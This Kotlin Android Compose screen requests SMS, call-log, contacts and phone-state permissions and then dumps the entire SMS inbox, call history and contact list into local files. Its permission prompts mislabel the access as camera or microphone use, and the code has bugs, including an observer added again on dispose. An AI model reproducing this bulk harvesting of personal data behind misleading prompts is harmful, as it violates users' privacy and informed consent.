package com.dev.chacha.presentation.permissions

import android.Manifest
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.widget.Toast
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import com.google.accompanist.permissions.ExperimentalPermissionsApi
import com.google.accompanist.permissions.rememberMultiplePermissionsState
import com.google.gson.GsonBuilder
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.BufferedWriter
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun RequestPermissions(
    viewModel: PermissionsViewModel = viewModel(),
    onClick: () -> Unit,

    ) {

    val permissionsState = rememberMultiplePermissionsState(
        permissions = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
        )
    )
    val context = LocalContext.current


    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(
        key1 = lifecycleOwner,
        effect = {
            val observer = LifecycleEventObserver { _, event ->
                if (event == Lifecycle.Event.ON_START) {
                    permissionsState.launchMultiplePermissionRequest()
                }
            }
            lifecycleOwner.lifecycle.addObserver(observer)
            onDispose {
                lifecycleOwner.lifecycle.addObserver(observer)
            }
        }
    )


    Column(
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        permissionsState.permissions.forEach { perms ->
            when (perms.permission) {
                Manifest.permission.READ_SMS -> {
                    when {
                        perms.hasPermission -> {
                            val smsCursor = context.contentResolver.query(
                                Telephony.Sms.Inbox.CONTENT_URI,
                                null,
                                null,
                                null,
                                null
                            )

                            if (smsCursor != null && smsCursor.moveToFirst()) {
                                val file = File(context.filesDir, "sms_messages.txt")
                                val outputStream = FileOutputStream(file)

                                do {
                                    val address = smsCursor.getString(
                                        smsCursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                                    )
                                    val body = smsCursor.getString(
                                        smsCursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                                    )
                                    val line = "$address: $body\n"
                                    outputStream.write(line.toByteArray())
                                } while (smsCursor.moveToNext())

                                outputStream.flush()
                                outputStream.close()

                                Toast.makeText(
                                    context,
                                    "SMS messages collected and saved to file",
                                    Toast.LENGTH_SHORT
                                ).show()
                            } else {
                                Toast.makeText(
                                    context,
                                    "No SMS messages found",
                                    Toast.LENGTH_SHORT
                                ).show()
                            }

                            smsCursor?.close()

                        }
                        perms.shouldShowRationale -> {
                            Text(
                                text = "Camera persmisson is needed " +
                                        "to access the camera"
                            )
                        }
                        perms.isPermanentlyDenied() -> {
                            Text(
                                text = "Camera persmisson is Permanantly Denied" +
                                        "you can enable it into app setting"
                            )
                        }
                    }
                }
                Manifest.permission.READ_CALL_LOG -> {
                    when {
                        perms.hasPermission -> {
                            //calls
                            val callLogsList = arrayListOf<CallLogs>()

                            val cursor = context.contentResolver.query(
                                CallLog.Calls.CONTENT_URI,
                                null, null, null, CallLog.Calls.DATE + " DESC"
                            )

                            while (cursor != null && cursor.moveToNext()) {
                                val id = cursor.getColumnIndex(CallLog.Calls._ID)
                                val callId = cursor.getString(id)

                                val phoneid = cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
                                val phoneId = cursor.getString(phoneid)

                                val number = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                                val phoneNumber = cursor.getString(number)

                                val type = cursor.getColumnIndex(CallLog.Calls.TYPE)
                                val callTypes = cursor.getString(type)
                                val callType = callTypes.toInt()

                                val date =
                                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                                val datee = Date(date.toLong())
                                val ft = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault())

                                // Call time

                                val smsTime =
                                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                                        .toLong()
                                val time = Date()
                                time.time = smsTime
                                val simpleTimeFormat = SimpleDateFormat("HH:mm:ss")
                                val timeString = simpleTimeFormat.format(time)

                                val simwhat =
                                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.VIA_NUMBER))

                                val duration = cursor.getColumnIndex(CallLog.Calls.DURATION)
                                val callDuration = cursor.getString(duration)

                                var dir: String? = null
                                when (callType) {
                                    CallLog.Calls.OUTGOING_TYPE ->                     // Log.d("type","OUTGOING");
                                        dir = "OUTGOING"
                                    CallLog.Calls.INCOMING_TYPE ->                     // System.out.println("INCOMING");
                                        //  Log.d("type","INCOMING");
                                        dir = "INCOMING"
                                    CallLog.Calls.MISSED_TYPE ->
                                        dir = "MISSED"
                                    CallLog.Calls.BLOCKED_TYPE -> {
                                        dir = "BLOCKED"
                                    }
                                    CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> {
                                        dir = "ANSWERED EXTERNALLY"
                                    }
                                    CallLog.Calls.REJECTED_TYPE -> {
                                        dir = "REJECTED"
                                    }
                                    CallLog.Calls.VOICEMAIL_TYPE -> {
                                        dir = "VOICE"
                                    }
                                }

                                callLogsList.add(
                                    CallLogs(
                                        callId, phoneId, phoneNumber, callType, callDuration,
                                        ft.format(datee), simwhat, timeString
                                    )
                                )
                            }

                            cursor?.close()

                            viewModel.viewModelScope.launch(Dispatchers.IO) {
                                val gson = GsonBuilder().setPrettyPrinting().create()
                                val userCallLogs = gson.toJson(callLogsList)
                                val userCallLogsString: String = userCallLogs.toString()
                                val fileCall = File(context.filesDir, "CalllogList.json")
                                val fileWriterCall = FileWriter(fileCall)
                                val bufferedWriterCall = BufferedWriter(fileWriterCall)
                                bufferedWriterCall.write(userCallLogsString)
                                bufferedWriterCall.close()

                            }


                        }
                        perms.shouldShowRationale -> {
                            Text(
                                text = "Audio persmisson is needed " +
                                        "to access the microphone"
                            )
                        }
                        perms.isPermanentlyDenied() -> {
                            Text(
                                text = "Audio persmisson is Permanantly Denied" +
                                        "you can enable it into app setting"
                            )
                        }
                    }
                }

                Manifest.permission.READ_CONTACTS -> {
                    when {
                        perms.hasPermission -> {
                            //contacts
                            val contactList = arrayListOf<Contacts>()
                            val cursor2 = context.contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                null,
                                null,
                                null
                            )
                            while (cursor2 != null && cursor2.moveToNext()) {
                                val userName =
                                    cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                                val userPhoneNumber =
                                    cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                val userEmail =
                                    cursor2.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
                                val userNumber =
                                    cursor2.getColumnIndex(ContactsContract.Contacts._ID)

                                val name = cursor2.getString(userName)
                                val phoneNumber = cursor2.getString(userPhoneNumber)
                                val email = cursor2.getString(userEmail)
                                val number = cursor2.getString(userNumber)

                                contactList.add(Contacts(name, phoneNumber, email, number))
                            }

                            cursor2?.close()

                            //contacts
                            val gson = GsonBuilder().setPrettyPrinting().create()
                            val userContact = gson.toJson(contactList)
                            val userContactString: String = userContact.toString()
                            val fileContact = File(context.filesDir, "ContactList.json")
                            val fileWriterContact = FileWriter(fileContact)
                            val bufferedWriterContact = BufferedWriter(fileWriterContact)
                            bufferedWriterContact.write(userContactString)
                            bufferedWriterContact.close()
                        }
                        perms.shouldShowRationale -> {
                            Text(
                                text = "Audio persmisson is needed " +
                                        "to access the microphone"
                            )
                        }
                        perms.isPermanentlyDenied() -> {
                            Text(
                                text = "Audio persmisson is Permanantly Denied" +
                                        "you can enable it into app setting"
                            )
                        }
                    }

                }
            }
        }

        Button(onClick = { permissionsState.launchMultiplePermissionRequest() }) {
            Text(text = "Click Here for permission")
        }
    }

}



